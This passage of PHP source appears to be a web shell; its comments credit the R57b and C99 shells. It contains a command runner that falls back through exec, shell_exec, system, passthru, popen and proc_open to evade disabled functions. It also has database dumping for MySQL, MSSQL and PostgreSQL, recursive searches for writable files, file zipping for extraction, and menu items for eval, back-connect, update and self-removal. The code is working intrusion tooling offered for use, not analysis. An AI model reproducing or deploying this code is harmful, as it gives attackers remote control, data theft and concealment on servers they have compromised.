        if (in_array($image, $v)) {
            $image = $k;
            break;
        }
    }

    if (empty($Img[$image])) $image = 'unk';
    return $Img[$image];
}

# Validate now
if ($Config['zPass']) {
	if ($Config['zAuthType'] === 'form') {
		//TODO
	} else {
		if (! isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER']) !== $Config['zName'] || md5($_SERVER['PHP_AUTH_PW']) !== $Config['zPass']) {
			header('WWW-Authenticate: Basic realm="Credentials request"');
			header('HTTP/1.0 401 Unauthorized');
			exit('<b>Access Denied</b>');
		}	
	}
}


# General functions
function execute($command) {
    $dis_func = get_cfg_var('disable_functions');
    $res = '';
    if ($command) {
        if (function_exists('exec') and ! in_array('exec', $dis_func)) {
            @exec($command, $res);
            $res = join("\n", $res);
        } elseif (function_exists('shell_exec') and ! in_array('shell_exec', $dis_func)) {
            $res = @shell_exec($command);
        } elseif (function_exists('system') and ! in_array('system', $dis_func)) {
            @ob_start();
            @system($command);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif (function_exists('passthru') and ! in_array('passthru', $dis_func)) {
            @ob_start();
            @passthru($command);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif (@is_resource($f = @popen($command, 'r'))) {
            $handle = popen($command, 'r'); // Open the command pipe for reading
            if (is_resource($handle)) {
                if (function_exists('fread') && function_exists('feof')) {
                    while (! feof($handle)) {
                        $res = fread($handle, 512);
                    }
                } elseif (function_exists('fgets') && function_exists('feof')) {
                    while (! feof($handle)) {
                        $res = fgets($handle, 512);
                    }
                }
            }
            pclose($handle);
        } elseif (function_exists('proc_open')) {
			// stdout is a pipe that the child will write to
            $descriptorspec = array(1 => array("pipe", "w"));
            $handle = proc_open($command, $descriptorspec, $pipes); // This will return the output to an array 'pipes'
            if (is_resource($handle)) {
                if (function_exists('fread') && function_exists('feof')) {
                    while (! feof($pipes[1])) {
                        $res = fread($pipes[1], 512);
                    }
                } elseif (function_exists('fgets') && function_exists('feof')) {
                    while (! feof($pipes[1])) {
                        $res = fgets($pipes[1], 512);
                    }
                }
            }
            pclose($handle);
        }
    }

    return(htmlspecialchars($res));
}

function safeStatus() {
    $safe_mode = @ini_get('safe_mode');

    if (! $safe_mode && strpos(execute('echo abcdef'), 'def') != 3) {
        $safe_mode = true;
    }

    return $safe_mode;
}

function getfun($funName) {
    global $Lang;
    return (false !== function_exists($funName)) ? $Lang['yes'] : $Lang['no'];
}

function getcfg($varname) {
    global $Lang;
    $result = get_cfg_var($varname);
    if ($result == 0) {
        return $Lang['no'];
    } elseif ($result == 1) {
        return $Lang['yes'];
    } else {
        return $result;
    }
}

function bg() {
    global $bgc;
    return ($bgc++ % 2 == 0) ? 'alt1' : 'alt2';
}

function sizecount($size) {
	$size = sprintf("%u", $size);
	if($size == 0) {
		return '0 B' ;
	}
	$sizename = array(' B', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
	return round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
}

function getPath($scriptpath, $nowpath) {
    if ($nowpath === '.') {
        $nowpath = $scriptpath;
    }
    $nowpath = str_replace(array('\\', '//'), '/', $nowpath);
    if (substr($nowpath, -1) !== '/') {
        $nowpath = $nowpath . '/';
    }
    return $nowpath;
}

function getUpPath($nowpath) {
    $pathdb = explode('/', $nowpath);
    $num = count($pathdb);
    if ($num > 2) {
        unset($pathdb[$num - 1], $pathdb[$num - 2]);
    }
    $uppath = implode('/', $pathdb) . '/';
    $uppath = str_replace('//', '/', $uppath);
    return $uppath;
}

function simpleDialog($info) {
    return '<br><div style="border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;">' . $info . '</div>';
}

function simpleValidate($variable) {
    if ((isset($variable)) and ($variable !== '')) {
        return true;
    } else {
        return false;
    }
}

# SQL (of R57b)
// TODO Oracle dump!!!!!!!!
class SQL {
    var $host = 'localhost';
    var $port = '';
    var $user = '';
    var $pass = '';
    var $base = '';
    var $db = '';
    var $connection;
    var $res;
    var $error;
    var $rows;
    var $columns;
    var $num_rows;
    var $num_fields;
    var $dump;

    function connect() {
        switch ($this->db) {
            case 'MySQL':
                if (empty($this->port)) {
                    $this->port = '3306';
                }
                if (! function_exists('mysql_connect')) return 0;
                $this->connection = @mysql_connect($this->host . ':' . $this->port, $this->user, $this->pass);
                if (is_resource($this->connection)) return 1;
                break;
            case 'MSSQL':
                if (empty($this->port)) {
                    $this->port = '1433';
                }
                if (! function_exists('mssql_connect')) return 0;
                $this->connection = @mssql_connect($this->host . ',' . $this->port, $this->user, $this->pass);
                if ($this->connection) return 1;
                break;
            case 'PostgreSQL':
                if (empty($this->port)) {
                    $this->port = '5432';
                }
                $str = "host='" . $this->host . "' port='" . $this->port . "' user='" . $this->user . "' password='" . $this->pass . "' dbname='" . $this->base . "'";
                if (! function_exists('pg_connect')) return 0;
                $this->connection = @pg_connect($str);
                if (is_resource($this->connection)) return 1;
                break;
            case 'Oracle':
                if (! function_exists('ocilogon')) return 0;
                $this->connection = @ocilogon($this->user, $this->pass, $this->base);
                if (is_resource($this->connection)) return 1;
                break;
        }

        return 0;
    }

    function select_db() {
        switch ($this->db) {
            case 'MySQL':
                if (@mysql_select_db($this->base, $this->connection)) return 1;
                break;
            case 'MSSQL':
                if (@mssql_select_db($this->base, $this->connection)) return 1;
                break;
            case 'PostgreSQL':
                return 1;
                break;
            case 'Oracle':
                return 1;
                break;
        }

        return 0;
    }

    function query($query) {
        $this->res = $this->error = '';
        switch ($this->db) {
            case 'MySQL':
                if (false === ($this->res = @mysql_query('/*' . chr(0) . '*/' . $query, $this->connection))) {
                    $this->error = @mysql_error($this->connection);
                    return 0;
                } else
                    if (is_resource($this->res)) {
                        return 1;
                    }
                return 2;
                break;
            case 'MSSQL':
                if (false === ($this->res = @mssql_query($query, $this->connection))) {
                    $this->error = 'Query error';
                    return 0;
                } else
                    if (@mssql_num_rows($this->res) > 0) {
                        return 1;
                    }
                return 2;
                break;
            case 'PostgreSQL':
                if (false === ($this->res = @pg_query($this->connection, $query))) {
                    $this->error = @pg_last_error($this->connection);
                    return 0;
                } else
                    if (@pg_num_rows($this->res) > 0) {
                        return 1;
                    }
                return 2;
                break;
            case 'Oracle':
                if (false === ($this->res = @ociparse($this->connection, $query))) {
                    $this->error = 'Query parse error';
                } else {
                    if (@ociexecute($this->res)) {
                        if (@ocirowcount($this->res) != 0) return 2;
                        return 1;
                    }
                    $error = @ocierror();
                    $this->error = $error['message'];
                }
                break;
        }

        return 0;
    }

    function get_result() {
        $this->rows = array();
        $this->columns = array();
        $this->num_rows = $this->num_fields = 0;

        switch ($this->db) {
            case 'MySQL':
                $this->num_rows = @mysql_num_rows($this->res);
                $this->num_fields = @mysql_num_fields($this->res);
                while (false !== ($this->rows[] = @mysql_fetch_assoc($this->res))) ;
                @mysql_free_result($this->res);
                if ($this->num_rows) {
                    $this->columns = @array_keys($this->rows[0]);
                    return 1;
                }
                break;
            case 'MSSQL':
                $this->num_rows = @mssql_num_rows($this->res);
                $this->num_fields = @mssql_num_fields($this->res);
                while (false !== ($this->rows[] = @mssql_fetch_assoc($this->res))) ;
                @mssql_free_result($this->res);
                if ($this->num_rows) {
                    $this->columns = @array_keys($this->rows[0]);
                    return 1;
                }
                ;
                break;
            case 'PostgreSQL':
                $this->num_rows = @pg_num_rows($this->res);
                $this->num_fields = @pg_num_fields($this->res);
                while (false !== ($this->rows[] = @pg_fetch_assoc($this->res))) ;
                @pg_free_result($this->res);
                if ($this->num_rows) {
                    $this->columns = @array_keys($this->rows[0]);
                    return 1;
                }
                break;
            case 'Oracle':
                $this->num_fields = @ocinumcols($this->res);
                while (false !== ($this->rows[] = @oci_fetch_assoc($this->res))) $this->num_rows++;
                @ocifreestatement($this->res);
                if ($this->num_rows) {
                    $this->columns = @array_keys($this->rows[0]);
                    return 1;
                }
                break;
        }

        return 0;
    }

    function dump($table) {
        if (empty($table)) return 0;
        $this->dump = array();
        $this->dump[0] = '##';
        $this->dump[1] = '## --------------------------------------- ';
        $this->dump[2] = '##  Created: ' . date("d/m/Y H:i:s");
        $this->dump[3] = '##  Database: ' . $this->base;
        $this->dump[4] = '##  Table: ' . $table;
        $this->dump[5] = '## --------------------------------------- ';

        switch ($this->db) {
            case 'MySQL':
                $this->dump[0] = '## MySQL dump';
                if ($this->query('/*' . chr(0) . '*/ SHOW CREATE TABLE `' . $table . '`') != 1) return 0;
                if (! $this->get_result()) return 0;
                $this->dump[] = $this->rows[0]['Create Table'];
                $this->dump[] = '## --------------------------------------- ';
                if ($this->query('/*' . chr(0) . '*/ SELECT * FROM `' . $table . '`') != 1) return 0;
                if (! $this->get_result()) return 0;
                for ($i = 0; $i < $this->num_rows; $i++) {
                    foreach ($this->rows[$i] as $k => $v) {
                        $this->rows[$i][$k] = @mysql_real_escape_string($v);
                    }
                    $this->dump[] = 'INSERT INTO `' . $table . '` (`' . @implode("`, `", $this->columns) . '`) VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
                }
                break;
            case 'MSSQL':
                $this->dump[0] = '## MSSQL dump';
                if ($this->query('SELECT * FROM ' . $table) != 1) return 0;
                if (! $this->get_result()) return 0;
                for ($i = 0; $i < $this->num_rows; $i++) {
                    foreach ($this->rows[$i] as $k => $v) {
                        $this->rows[$i][$k] = @addslashes($v);
                    }
                    $this->dump[] = 'INSERT INTO ' . $table . ' (' . @implode(", ", $this->columns) . ') VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
                }
                break;
            case 'PostgreSQL':
                $this->dump[0] = '## PostgreSQL dump';
                if ($this->query('SELECT * FROM ' . $table) != 1) return 0;
                if (! $this->get_result()) return 0;
                for ($i = 0; $i < $this->num_rows; $i++) {
                    foreach ($this->rows[$i] as $k => $v) {
                        $this->rows[$i][$k] = @addslashes($v);
                    }
                    $this->dump[] = 'INSERT INTO ' . $table . ' (' . @implode(", ", $this->columns) . ') VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
                }
                break;
            case 'Oracle':
                $this->dump[0] = '## ORACLE dump';
                $this->dump[] = '## under construction';
                break;
            default:
                return 0;
                break;
        }

        return 1;
    }

    function close() {
        switch ($this->db) {
            case 'MySQL':
                @mysql_close($this->connection);
                break;
            case 'MSSQL':
                @mssql_close($this->connection);
                break;
            case 'PostgreSQL':
                @pg_close($this->connection);
                break;
            case 'Oracle':
                @oci_close($this->connection);
                break;
        }
    }

    function affected_rows() {
        switch ($this->db) {
            case 'MySQL':
                return @mysql_affected_rows($this->res);
                break;
            case 'MSSQL':
                return @mssql_affected_rows($this->res);
                break;
            case 'PostgreSQL':
                return @pg_affected_rows($this->res);
                break;
            case 'Oracle':
                return @ocirowcount($this->res);
                break;
            default:
                return 0;
                break;
        }
    }
}

//TODO agregar posibilidad de ir dumpeando mientras se hace en lugar de en memoria
//para poder usarlo con archivos enormes/poca memoria
# Based on PHPZip v1.2 by DSR!
class PHPZip {
    var $datasec = array();
    var $ctrl_dir = array();
    var $old_offset = 0;

    function Zipper($filelist) {
		$curdir = dirname($filelist[0]);
		foreach ($filelist as $filename) {	
			if (file_exists($filename)) {
				if (is_dir($filename)) {
					$content = $this->GetFileList($filename, $curdir);
				}
				
				if (is_file($filename)) {
					$fd = fopen($filename, 'r');
					$content = fread($fd, filesize($filename));
					fclose($fd);
					$this->addFile($content, str_replace($curdir . '/', '', $filename));
				}
			}
        }
        $out = $this->file();
		
        return 1;
    }

    function GetFileList($dir, $curdir) {
        if (file_exists($dir)) {			
			$dirPrefix = basename($dir) . '/';
            $dh = opendir($dir);
            while ($files = readdir($dh)) {
                if (($files !== '.') && ($files !== '..')) {
                    if (is_dir($dir . $files)) {
                        $this->GetFileList($dir . $files . '/', $curdir);
                    } else {
						$fd = fopen($dir . $files, 'r');
						$content = fread($fd, filesize($dir . $files));
						fclose($fd);
						$this->addFile($content, str_replace($curdir . '/', '', $dir . $files));
                    }
                }
            }
            closedir($dh);
        }
        return 1;
    }

    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
        if ($timearray['year'] < 1980) {
            $timearray['year'] = 1980;
            $timearray['mon'] = 1;
            $timearray['mday'] = 1;
            $timearray['hours'] = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        }
        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    }
	
	function hex2bin($str) {
		$bin = '';
		$i = 0;
		do {
			$bin .= chr(hexdec($str{$i}.$str{($i + 1)}));
			$i += 2;
		} while ($i < strlen($str));
		return $bin;
	}

    function addFile($data, $name, $time = 0) {
		//echo $name . '<br>'; //debug
        //$name = str_replace('\\', '/', $name);
        $dtime = dechex($this->unix2DosTime($time));
		$hexdtime = $this->hex2bin($dtime[6] . $dtime[7] . $dtime[4] . $dtime[5] . $dtime[2] . $dtime[3] . $dtime[0] . $dtime[1]);
        $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00" . $hexdtime;

        // "local file header" segment
        $unc_len = strlen($data);
        $crc = crc32($data);
        $zdata = gzcompress($data);
        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $c_len = strlen($zdata);
        $fr .= pack('V', $crc);
        $fr .= pack('V', $c_len);
        $fr .= pack('V', $unc_len);
        $fr .= pack('v', strlen($name));
        $fr .= pack('v', 0);
        $fr .= $name;

        // "file data" segment
        $fr .= $zdata;

        // "data descriptor" segment
        $fr .= pack('V', $crc);
        $fr .= pack('V', $c_len);
        $fr .= pack('V', $unc_len);

        // add this entry to array
        $this->datasec[] = $fr;

        // now add to central directory record
        $cdrec = "\x50\x4b\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00" . $hexdtime;
        $cdrec .= pack('V', $crc);
        $cdrec .= pack('V', $c_len);
        $cdrec .= pack('V', $unc_len);
        $cdrec .= pack('v', strlen($name));
        $cdrec .= pack('v', 0);
        $cdrec .= pack('v', 0);
        $cdrec .= pack('v', 0);
        $cdrec .= pack('v', 0);
        $cdrec .= pack('V', 32);

        $cdrec .= pack('V', $this->old_offset);
        $this->old_offset += strlen($fr);
        $cdrec .= $name;

        // save to central directory
        $this->ctrl_dir[] = $cdrec;
    }

    function file() {
		//exit; //debug
        $data = implode('', $this->datasec);
        $ctrldir = implode('', $this->ctrl_dir);
        return $data . $ctrldir . "\x50\x4b\x05\x06\x00\x00\x00\x00" . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
    }

    function output($file) {
        $fp = fopen($file, 'w');
        fwrite($fp, $this->file());
        fclose($fp);
    }
}

//TODO
//Si no puedo usar Zip uso otro metodo
/*function compress($filename, $filedump, $compress) {
    if ($compress === 'bzip' && @function_exists('bzcompress')) {
        $filename .= '.bz2';
        $mime_type = 'application/x-bzip2';
        $filedump = bzcompress($filedump);
    } else
        if ($compress === 'gzip' && @function_exists('gzencode')) {
            $filename .= '.gz';
            $content_encoding = 'x-gzip';
            $mime_type = 'application/x-gzip';
            $filedump = gzencode($filedump);
        } else
            if ($compress === 'zip' && @function_exists('gzcompress')) {
                $filename .= '.zip';
                $mime_type = 'application/zip';
                $zipfile = new zipfile();
                $zipfile->addFile($filedump, substr($filename, 0, -4));
                $filedump = $zipfile->file();
            } else {
                $mime_type = 'application/octet-stream';
            }

            //
            if(!empty($_POST['cmd']) && $_POST['cmd']=="download_file" && !empty($_POST['d_name'])) {
            if(!$file=@fopen($_POST['d_name'],"r")) {
            err(1,$_POST['d_name']); 
            $_POST['cmd']=""; 
            } else {
            @ob_clean();
            $filename = @basename($_POST['d_name']);
            $filedump = @fread($file,@filesize($_POST['d_name']));
            fclose($file);
            $content_encoding = $mime_type = '';
            compress($filename,$filedump,$_POST['compress']);
            if (!empty($content_encoding)) {
            header('Content-Encoding: ' . $content_encoding);
            }
            header("Content-type: ".$mime_type);
            header("Content-disposition: attachment; filename=\"".$filename."\";");
            echo $filedump;
            exit();
            }
            }
            //
}*/
////////////////////////////

# Menu
$sysMenu = '
        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'file\'));"><b>' . $Lang['fm'] . '</b></a> |     
        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'tools\'));"><b>' . $Lang['tools'] . '</b></a> |     
        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'procs\'));"><b>' . $Lang['procs'] . '</b></a> |         
        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'phpenv\'));"><b>' . $Lang['info'] . '</b></a> |     
        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'connect\'));"><b>' . $Lang['ec'] . '</b></a> |     
        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'sql\'));"><b>' . $Lang['sql'] . '</b></a> |     
        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'eval\'));"><b>' . $Lang['eval'] . '</b></a> |     
        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'update\'));"><b>' . $Lang['update'] . '</b></a> |     
        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'selfremove\'));"><b>' . $Lang['sr'] . '</b></a>
		' . (($Config['zPass']) ? ' | <a href="#" onclick="if (confirm(\'' . $Lang['merror'] . '\')) window.close();return false;"><b>' . $Lang['out'] . '</b></a>' : '');

# Sections
if ($_POST[$Config['Menu']] === 'file') {
	$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
	//provisorio
	define('SA_ROOT', str_replace('\\', '/', dirname(__file__)) . '/');
	$nowpath = getPath(SA_ROOT, '.');
    
	function dirsize($dir) {
        $dh = @opendir($dir);
        $size = 0;
        while ($file = @readdir($dh)) {
            if ($file !== '.' && $file !== '..') {
                $path = $dir . '/' . $file;
                $size += @is_dir($path) ? dirsize($path) : @filesize($path);
            }
        }
        @closedir($dh);
        return $size;
    }

    function getChmod($filepath) {
        return substr(base_convert(@fileperms($filepath), 10, 8), -4);
    }

    function getPerms($filepath){ # C99r16
		$mode = @fileperms($filepath);
        if (($mode & 0xC000) === 0xC000) {$type = 's';}    // Socket
        elseif (($mode & 0x4000) === 0x4000) {$type = 'd';}// Directory
        elseif (($mode & 0xA000) === 0xA000) {$type = 'l';}// Symbolic Link
        elseif (($mode & 0x8000) === 0x8000) {$type = '-';}// Regular 
        elseif (($mode & 0x6000) === 0x6000) {$type = 'b';}// Block special
		elseif (($mode & 0x2000) === 0x2000) {$type = 'c';}// Character special
		elseif (($mode & 0x1000) === 0x1000) {$type = 'p';}// FIFO pipe
		else {$type = '?';}                                // Unknown

		$owner['read'] = ($mode & 00400) ?    'r' : '-'; 
		$owner['write'] = ($mode & 00200) ?   'w' : '-'; 
		$owner['execute'] = ($mode & 00100) ? 'x' : '-'; 
		$group['read'] = ($mode & 00040) ?    'r' : '-'; 
		$group['write'] = ($mode & 00020) ?   'w' : '-'; 
		$group['execute'] = ($mode & 00010) ? 'x' : '-'; 
		$world['read'] = ($mode & 00004) ?    'r' : '-'; 
		$world['write'] = ($mode & 00002) ?   'w' : '-'; 
		$world['execute'] = ($mode & 00001) ? 'x' : '-'; 

		if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
		if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
		if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}
		
		return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
    }
		
    function getext($file) {
		$info = pathinfo($file);
		return $info['extension'];
    }

    function getUser($filepath) {
		if (function_exists('posix_getpwuid')) {
		$array = @posix_getpwuid(@fileowner($filepath));
			if ($array && is_array($array)) {
				return ' / <a href="#" title="User: ' . $array['name'] . '
					Passwd: ' . $array['passwd'] . '
					Uid: ' . $array['uid'] . '
					gid: ' . $array['gid'] . '
					Gecos: ' . $array['gecos'] . '
					Dir: ' . $array['dir'] . '
					Shell: ' . $array['shell'] . '">' . $array['name'] . '</a>';
			}
		}
		return '';
    }

    function GetWDirList($dir) {
            global $dirdata, $j, $nowpath;
            ! $j && $j = 1;
            if ($dh = opendir($dir)) {
                while ($file = readdir($dh)) {
                    $f = str_replace('//', '/', $dir . '/' . $file);
                    if ($file !== '.' && $file !== '..' && is_dir($f)) {
                        if (is_writable($f)) {
                            $dirdata[$j]['filename'] = str_replace($nowpath, '', $f);
                            $dirdata[$j]['mtime'] = @date('Y-m-d H:i:s', filemtime($f));
                            $dirdata[$j]['dirchmod'] = getChmod($f);
                            $dirdata[$j]['dirperm'] = getPerms($f);
                            $dirdata[$j]['dirlink'] = $dir;
                            $dirdata[$j]['server_link'] = $f;
                            $j++;
                        }
                        GetWDirList($f);
                    }
                }
                closedir($dh);
                clearstatcache();
                return $dirdata;
            } else {
                return array();
            }
    }

    function GetWFileList($dir) {
            global $filedata, $j, $nowpath, $writabledb;
            ! $j && $j = 1;
            if ($dh = opendir($dir)) {
                while ($file = readdir($dh)) {
                    $ext = getext($file);
                    $f = str_replace('//', '/', $dir . '/' . $file);
                    if ($file !== '.' && $file !== '..' && is_dir($f)) {
                        GetWFileList($f);
                    } elseif ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))) {
                        if (is_writable($f)) {
                            $filedata[$j]['filename'] = str_replace($nowpath, '', $f);
                            $filedata[$j]['size'] = sizecount(@filesize($f));
                            $filedata[$j]['mtime'] = @date('Y-m-d H:i:s', filemtime($f));
                            $filedata[$j]['filechmod'] = getChmod($f);
                            $filedata[$j]['fileperm'] = getPerms($f);
                            $filedata[$j]['fileowner'] = getUser($f);
                            $filedata[$j]['dirlink'] = $dir;
                            $filedata[$j]['server_link'] = $f;
                            $j++;
                        }
                    }
                }
                closedir($dh);
                clearstatcache();
                return $filedata;
            } else {
                return array();
            }
    }

    function GetSFileList($dir, $content, $re = 0) {
            global $filedata, $j, $nowpath, $writabledb;
            ! $j && $j = 1;
            if ($dh = opendir($dir)) {
                while ($file = readdir($dh)) {
                    $ext = getext($file);
                    $f = str_replace('//', '/', $dir . '/' . $file);
                    if ($file !== '.' && $file !== '..' && is_dir($f)) {
                        GetSFileList($f, $content, $re = 0);
                    } elseif ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))) {
                        $find = 0;
                        if ($re) {
                            if (preg_match('@' . $content . '@', $file) || preg_match('@' . $content . '@', @file_get_contents($f))) {
                                $find = 1;
                            }
                        } else {
                            if (strstr($file, $content) || strstr(@file_get_contents($f), $content)) {
                                $find = 1;
                            }
                        }
                        if ($find) {
                            $filedata[$j]['filename'] = str_replace($nowpath, '', $f);
                            $filedata[$j]['size'] = sizecount(@filesize($f));
                            $filedata[$j]['mtime'] = @date('Y-m-d H:i:s', filemtime($f));
                            $filedata[$j]['filechmod'] = getChmod($f);
                            $filedata[$j]['fileperm'] = getPerms($f);
                            $filedata[$j]['fileowner'] = getUser($f);
                            $filedata[$j]['dirlink'] = $dir;
                            $filedata[$j]['server_link'] = $f;
                            $j++;
                        }
                    }
                }
                closedir($dh);
                clearstatcache();
                return $filedata;
            } else {
                return array();
            }
    }

    function delTree($path) {
            $origipath = $path;
            $handler = opendir($path);
            while (true) {
                $item = readdir($handler);
                if ($item === '.' or $item === '..') {
                    continue;
                } elseif (gettype($item) === 'boolean') {
                    closedir($handler);
                    if (! @rmdir($path)) {
                        return false;
                    }
                    if ($path == $origipath) {
                        break;
                    }
                    $path = substr($path, 0, strrpos($path, '/'));
                    $handler = opendir($path);
                } elseif (is_dir($path . '/' . $item)) {
                    closedir($handler);
                    $path = $path . '/' . $item;
                    $handler = opendir($path);
                } else {
                    unlink($path . '/' . $item);
                }
            }
            return true;
    }
		
    function recursiveCopy($path, $dest){ 
		if (is_dir($path)) {
			@mkdir($dest);
			$objects = scandir($path);
			if (sizeof($objects) > 0) {
				foreach($objects as $file) {
					if ($file !== '.' && $file !== '..') {
						if (is_dir($path.$file)) {
							recursiveCopy($path . $file . '/', $dest . '/' . $file . '/');
						} else {
							copy($path . $file, $dest . $file);
						}
					}
				}
			}
			return true;
		} elseif(is_file($path)) {
			return copy($path, $dest);
		} else {
			return false;
		} 
    }

	function view_perms_color($target) { 
		if (! is_readable($target)) {
			return '<font color=red>' . getPerms(fileperms($target)) . '</font>';
		} elseif (! is_writable($target)) {
			return '<font color=white>' . getPerms(fileperms($target)) . '</font>';
		} else {
			return '<font color=green>' . getPerms(fileperms($target)) . '</font>';
		} 
	}	



	$Javascript = "
			function createfile(nowpath){
				mkfile = prompt('Ingrese nombre del archivo:', '');
				if (!mkfile) return;
				sendData('createfile', Array('mkfile', 'dir'), Array(mkfile, nowpath));
			}
			
			function createdir(nowpath){
				newdirname = prompt('Ingresa el nombre del directorio:', '');
				if (!newdirname) return;
				sendData('createdir', Array('newdirname', 'dir'), Array(newdirname, nowpath));
			}
			
			function deldir(deldir){
				action = confirm('Esta seguro que desea eliminar: \\n' + deldir);
				if (action == true) {
					sendData('deldir', Array('deldir'), Array(deldir));
				}
			}
			
			function fileperm(pfile){
				var newperm;
				newperm = prompt('Archivo actual:\\n' + pfile + '\\nIngresa un nuevo atributo:', '');
				if (!newperm) return;
				sendData('modpers', Array('newperm', 'pfile'), Array(newperm, pfile));
			}
			
			function rename(oldname){
				newname = prompt('Former file name:\\n' + oldname + '\\nEscribe la ruta del archivo:', '');
				if (!newname) return;
				sendData('rename', Array('newfilename', 'oldfilename'), Array(newname, oldname));
			}
			
			function copyfile(){
				var temp;
				tofile = prompt('Archivo(s) a la siguiente ruta:\\n', '');
				if (!tofile) return;
				temp += '<input type=\"hidden\" name=\"" . $Config['Action'] . "\" value=\"copy\"/>';				
				temp += '<input type=\"hidden\" name=\"copy\" value=\"' + tofile + '\"/>';				
				document.getElementById('info').innerHTML = temp;
				document.filelist.submit();
			}

			function process(action){
				document.getElementById('info').innerHTML = '<input type=\"hidden\" name=\"" . $Config['Action'] . "\" value=\"' + action + '\"/>';
				document.filelist.submit();
			}

			function viewSize(folder, target){
				document.getElementById(target).innerHTML = '[...]';
				var xmlhttp;
				if (window.XMLHttpRequest) {
					xmlhttp=new XMLHttpRequest();
				} else {
					xmlhttp=new ActiveXObject('Microsoft.XMLHTTP');
				}
				xmlhttp.onreadystatechange = function() {
					if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
						document.getElementById(target).innerHTML = xmlhttp.responseText;
					}
				}
				var params = '" . $Config['Menu'] . "=file&" . $Config['Mode'] . "=viewSize&folder=' + folder;
				xmlhttp.open('POST', '" . $self . "', true);
				xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
				xmlhttp.setRequestHeader('Content-length', params.length);
				xmlhttp.setRequestHeader('Connection', 'close');
				xmlhttp.send(params);
			}
			
			function popUp(url) { //hardcodear valores/calcularlos
				name   = 'DSR!';
				width  = 780;
				height = 300;
				
				left = parseInt((screen.width - width) / 2);
				top  = parseInt((screen.height - height) / 2);
				settings = 'width=' + width + ', height=' + height + ', left=' + left + ', top=' + top + ', location=no, directories=no, menubar=no, toolbar=no, status=no, scrollbars=yes, resizable=yes, fullscreen=no'
				popup = window.open(url, name, settings);
				popup.focus();
			}
			";	
			

    if (@$_POST[$Config['Mode']] === 'viewSize') {
		$thissize = dirsize($_POST['folder']);
		echo is_numeric($thissize) ? sizecount($thissize) : 'Unknown';
		exit;
    } elseif (@$_POST[$Config['Mode']] === 'info') {
		$Content .= '<b>Information:</b>
					 <table border=0 cellspacing=1 cellpadding=2>
					 <tr><td><b>Path</b></td><td> ' . $_POST['target'] . '</td></tr>
					 <tr><td><b>Size</b></td><td> ' . sizecount(filesize($_POST['target'])) . '</td></tr>
					 <tr><td><b>MD5</b></td><td> ' . md5_file($_POST['target']) . '</td></tr>';
		if (!$isWIN) {
			$Content .= '<tr><td><b>Owner/Group</b></td><td> ';
			$ow = posix_getpwuid(fileowner($_POST['target']));
			$gr = posix_getgrgid(filegroup($_POST['target']));
			$Content .= ($ow['name'] ? $ow['name'] : fileowner($_POST['target'])) . '/' . ($gr['name'] ? $gr['name'] : filegroup($_POST['target']));
		}
		$Content .= '<tr><td><b>Perms</b></td>
					 <td>' . view_perms_color($_POST['target']) . '</td></tr>
					 <tr><td><b>Create time</b></td>
					 <td> ' . date('d/m/Y H:i:s', filectime($_POST['target'])) . '</td></tr>
					 <tr><td><b>Access time</b></td><td> ' . date('d/m/Y H:i:s', fileatime($_POST['target'])) . '</td></tr>
					 <tr><td><b>MODIFY time</b></td><td> ' . date('d/m/Y H:i:s', filemtime($_POST['target'])) . '</td></tr>
					 </table><br>';
		
		$fp  = @fopen($_POST['target'], 'rb');
		if ($fp) {
			if (@simpleValidate($_POST['hexdump'])) {
				if ($_POST['hexdump'] === 'full') {
					$Content .= '<b>Hex Dump</b>';
					$str = fread($fp, filesize($_POST['target']));
				} else {
					$Content .= '<b>Hex Dump Preview</b>';
					$str = fread($fp, $Config['hexdump_lines'] * $Config['hexdump_rows']);
				}
				
				$counter      = 0;
				$show_offset  = '00000000<br>';
				$show_hex     = '';
				$show_content = '';
				for ($i = 0; $i < strlen($str); $i++) {
					$show_hex .= sprintf('%02X', ord($str[$i])) . ' ';
